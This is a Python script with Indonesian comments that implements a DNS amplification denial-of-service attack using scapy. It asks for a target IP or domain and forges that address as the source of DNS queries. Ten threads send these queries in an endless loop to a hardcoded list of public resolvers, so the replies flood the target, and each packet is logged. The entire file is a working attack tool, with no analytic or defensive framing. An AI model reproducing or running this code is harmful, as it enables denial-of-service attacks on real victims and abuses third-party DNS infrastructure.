import random
import time
import threading
import logging
import socket
from scapy.all import IP, UDP, DNS, DNSQR, send

# Fungsi untuk resolve domain menjadi IP jika diperlukan
def resolve_target(target):
    try:
        # Jika target adalah domain, resolve ke alamat IP
        return socket.gethostbyname(target)
    except socket.gaierror:
        # Jika tidak bisa resolve, anggap sebagai alamat IP langsung
        return target

# Fungsi untuk generate alamat IP secara acak (digunakan dalam serangan spoofing)
def generate_random_ip():
    return ".".join(map(str, (random.randint(1, 254) for _ in range(4))))

# Setup logging untuk mencatat aktivitas serangan
logging.basicConfig(filename="attack_log.txt", level=logging.INFO, format="%(asctime)s - %(message)s")

# Daftar DNS server publik
dns_servers = [
    "8.8.8.8",    # Google DNS
    "8.8.4.4",    # Google DNS
    "1.1.1.1",    # Cloudflare DNS
    "1.0.0.1",    # Cloudflare DNS
    "9.9.9.9",    # Quad9 DNS
    "149.112.112.112",  # Quad9 DNS
    "208.67.222.222",   # OpenDNS
    "208.67.220.220",   # OpenDNS
    "77.88.8.8",    # Yandex DNS
    "77.88.8.1",    # Yandex DNS
    "8.26.56.26",   # Comodo Secure DNS
    "8.20.247.20",  # Comodo Secure DNS
    "209.244.0.3",  # Level3 DNS
    "209.244.0.4",  # Level3 DNS
    "84.200.69.80", # DNS.WATCH
    "84.200.70.40"  # DNS.WATCH
]

# Fungsi untuk melakukan DNS Amplification Attack (Reflection Attack)
def dns_amplification_attack(target_ip):
    while True:
        # Memilih DNS server acak dari daftar
        dns_server = random.choice(dns_servers)

        # Mengirim permintaan DNS dengan IP target sebagai sumber (spoofing)
        dns_query = IP(src=target_ip, dst=dns_server) / UDP(sport=random.randint(1024, 65535), dport=53) / DNS(rd=1, qd=DNSQR(qname="google.com"))

        # Mengirim paket DNS query
        send(dns_query, verbose=False)

        # Logging aktivitas paket
        logging.info(f"DNS Amplification packet sent with spoofed source {target_ip} to DNS server {dns_server}")

        # Delay 0.3 detik sebelum mengirim permintaan berikutnya
        time.sleep(0.3)

# Meminta input dari pengguna untuk IP atau domain target
target = input("Masukkan alamat IP atau domain target: ")

# Resolusi domain ke IP jika diperlukan
resolved_target_ip = resolve_target(target)
print(f"Target telah di-resolve menjadi: {resolved_target_ip}")

# Membuat beberapa thread untuk menjalankan serangan secara paralel
threads = []

# 10 thread untuk DNS Amplification Attack
for i in range(10):
    thread_dns = threading.Thread(target=dns_amplification_attack, args=(resolved_target_ip,))
    threads.append(thread_dns)
    thread_dns.start()

# Menunggu semua thread selesai (program akan terus berjalan)
for thread in threads:
    thread.join()
